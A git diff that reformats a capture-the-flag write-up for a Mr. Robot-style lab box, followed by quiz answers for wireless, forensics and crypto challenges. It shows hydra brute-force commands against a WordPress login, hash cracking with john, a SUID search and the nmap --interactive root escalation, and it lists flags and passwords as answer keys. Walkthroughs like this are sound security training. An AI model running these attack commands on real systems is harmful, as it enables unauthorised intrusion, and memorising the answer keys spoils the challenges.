@@ -36,7 +36,7 @@ Nmap done: 1 IP address (1 host up) scanned in 74.41 seconds
 
 >On the browser: http://MACHINE_IP/robots.txt
 
->In the `robots.txt` we discover very interesting files. The *fsocity.dic* which from my guess is a dictionary file. As well we find our first key. Very impressive huuh!!
+>In the `robots.txt` we discover very interesting files. The `fsocity.dic` which from my guess is a dictionary file. As well we find our first key. Very impressive huuh!!
 
 ### Dir Fuzzing
 
@@ -74,19 +74,22 @@ Progress: 598 / 207644 (0.29%)                                                  
 
 ```
 
->Directory enumeration has given very juicy information that guides me to the next step. From this I discovered a wordpress site with a login page at /wp-admin.
+>Directory enumeration has given very juicy information that guides me to the next step. From this I discovered a wordpress site with a login page at `/wp-admin`.
 
 
 Definitely what comes to my mind is do a bruteforce attack to discover username and password since we have a custom wordlist for it.
 
 For this task i decide to use hydra for bruteforcing.
-
-`hydra -L fsocity.dic -p test MACHINE_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30`
+```
+hydra -L fsocity.dic -p test MACHINE_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
+```
 
 
 >This hydra command gives us the username and the next thing i needed was a password to be able to gain access to the wordpress site. So I did another hydra bruteforce to get the password.
 
-`hydra -l Elliot -P fsocity.dic MACHINE_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30`
+```
+hydra -l Elliot -P fsocity.dic MACHINE_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
+```
 
 > Using the username and password I obtained from the bruteforce, I gained access to the site and looking through I could see the logged in user has the privileges of editing the site and this was an amazing discovery. Having editor privileges means as an attacker I can launch a reverse shell. Interesting one here.
 > I searched on the web for a php revshell script since the site has `.php` extension templates. I love visiting the pentestmonkey site for rev shell scripts 
@@ -115,13 +118,17 @@ daemon@linux:/$
 ```
 >When I navigated to the `/home/robot` directory I found the second key and an MD5 password hash. This gives us a hint  that to read the key, I needed a password which might be contained in the password hash. I used john to try  crack the password hash.
 
-`john md5.hash --wordlist=fsocity.dic --format=Raw-MD5`
+```
+john md5.hash --wordlist=fsocity.dic --format=Raw-MD5
+```
 
 >I got the password and I was able to read the second key.
 ## Privilege Escalation 
 >In privilege escalation, I tried several tricks but couldn't really work until I attempted to find some SUID binaries
 
-`find / -perm +6000 2>/dev/null | grep '/bin'`
+```
+find / -perm +6000 2>/dev/null | grep '/bin'
+```
 >I quickly spotted the nmap binary SUID. Went to GTFOBins to find its exploit
 >On the terminal, I used this exploit for nmpa suid binary to have my way in as `root`
 
@@ -133,7 +140,9 @@ nmap --interactive
 ### The Challenge Questions
 
 How Many Ports are Open on the Machine ?
- `3`
+ ```
+ 3
+ ```
  From the scan results only 2 ports were open but anyway the correct answer accepted was that of 3 ports which were displayed from the scan.
 What Is CMS in full ? (lowercase) 
 ```
@@ -165,22 +174,31 @@ what is the linux command used to get uinique words ?
 ```
 uniq
 ```
- How many words are in the fsociety.dic
- `wc fsocity.dic                                                      
+How many words are in the fsociety.dic
+ ```
+ wc fsocity.dic                                                      
  858160  858160 7245381 fsocity.dic
- `
+ ```
 using the commands create a oneliner command to sort fsocity.dic get unique words and save to a file called new.txt.
 ```
 sort fsocity.dic | uniq > new.txt
 ```
  How many words are in new.txt
- `11451`
+ ```
+ 11451
+ ```
  Whats the name of the famous tool used to bruteforce logins ?
- `hydra`
+ ```
+ hydra
+ ```
  Which tool is used to enumerate the mentioned CMS  ?
- `wpscan`
+ ```
+ wpscan
+ ```
  Whats the option supplied to the CMS tool you mentioned to supply a password wordlist ?
- `-P`
+ ```
+ -P
+ ```
  Try wpscan --help
  
  
@@ -194,65 +212,106 @@ Using one of the tools  enumerate for users. Whats the name of the user whose pa
 Elliot
 ```
  Whats the password found ?
- `ER28-0652`
+ ```
+ ER28-0652
+ ```
  which php function executes shell commands and returns the last line ?
- `exec`
+ ```
+ exec
+ ```
  What is the name of the payload used to connect back a shell to us ?(lowercase)
- `revershell`
+ ```
+ revershell
+ ```
  What is the script used to perform enumeration for local privilege escalation vectors ?
- `linpeas.sh`
+ ```
+ linpeas.sh
+ ```
  
  Google it!!
  What is the md5 password of user robot
- `c3fcd3d76192e4007dfb496cca67e13b`
+ ```
+ c3fcd3d76192e4007dfb496cca67e13b
+ ```
  What is the used to switch to user robot
- `su robot`
+ ```
+ su robot
+ ```
  What is robots password
- `abcdefghijklmnopqrstuvwxyz`
+ ```
+ abcdefghijklmnopqrstuvwxyz
+```
  Key 2
- `822c73956184f694993bede3eb39f959`
+ ```
+ 822c73956184f694993bede3eb39f959
+ ```
  What is the name of the binary with SUID bit set
- `nmap`
+ ```
+ nmap
+ ```
  Key 3
- `04787ddef27c3dee1ee161b21670b4e4`
+ ```
+ 04787ddef27c3dee1ee161b21670b4e4
+ ```
 
 ## Wireless Security
 This section mostly required one to google a lot so it was pretty easy.
  #### The questions;
  What is an AP in full ?(lowercase)
- `access point`
+ ```
+ access point
+ ```
  What does STA stand for ? (lowercase)
- `station`
+ ```
+ station
+ ```
  What is the abbreviation for the name given to a AP ?
- `SSID`
+ ```
+ SSID
+ ```
  What is the name of the attack where a user kicks other users from a wifi AP ? 
- `deauthentication attack`
+ ```
+ deauthentication attack
+ ```
  What is the python module used by hacker to craft and inject packets ?
- `scapy`
+ ```
+ scapy
+ ```
  WEP uses a 24bit IV. This was improved in WPA because the tiny IV cause a problem called ?
- `collision`
+ ```
+ collision
+ ```
 
  ## Forensics
- This challenge gave me a little bit of hard time but finally i managed to crack it down. It was pretty easy and fun as well. You had to download a pcap file and analyze it using wireshark.
- 
-So on opening the file with wireshark, checked on the data from the FTP stream and came across an encoded password which was shared to Mr.Blue.
+>This challenge gave me a little bit of hard time but finally i managed to crack it down. It was pretty easy and fun as well. You had to download a pcap file and analyze it using wireshark.
+>So on opening the file with wireshark, checked on the data from the FTP stream and came across an encoded password which was shared to Mr.Blue.
 
 ### Questions
- What is the tool used to analyze the file provided
- `wireshark`
- What is the md5 hash of the file
- `
+
+What is the tool used to analyze the file provided
+ ```
+ wireshark
+ ```
+What is the md5 hash of the file
+```
 └─$ md5sum InterceptedTraffic.pcapng 
 95f876aa3faf2077d797a8b42063b824  InterceptedTraffic.pcapng
-                                                            `
- What is the encoded vault password that was sent to Mr Blue
- `3KJ5e1uR926ABg2mgeym9yemv3VgA3a5AiQZiNmLV7ecdBa`
- What encoding scheme was used to encode the password
+```
+                                                            
+What is the encoded vault password that was sent to Mr Blue
+ ```
+ 3KJ5e1uR926ABg2mgeym9yemv3VgA3a5AiQZiNmLV7ecdBa
+ ```
+What encoding scheme was used to encode the password
  `base58`
-  What is the decoded password
-  `flag{wireshark_is_a_powerful_tool}`
-  what is the protocol used to send the message?(lowercase)
-  `FTP`
+What is the decoded password
+  ```
+  flag{wireshark_is_a_powerful_tool}
+  ```
+what is the protocol used to send the message?(lowercase)
+  ```
+  FTP
+  ```
   
 ## Crypto
 Crypto challenge was a walk in the park for me..finished within few minutes😂😂
@@ -277,10 +336,10 @@ winteistheculprit
 ```
  Just another kind of  Ceaser, decrypt => ireelrnflpunyyratr 
  This was the final challenge and got very easy as well. Online decoder and boom you got your flag.
- 
- `verryeasychallenge`
- 
- That marked the end of our amazing preliminary CTF and I hope that was helpful. Cheers and happy hacking🥳🥳🥳
+ ```
+ verryeasychallenge
+ ```
+>That marked the end of our amazing preliminary CTF and I hope that was helpful. Cheers and happy hacking🥳🥳🥳
 And we pwned the Box !
 
 Thanks for reading, Suggestions & Feedback are appreciated !
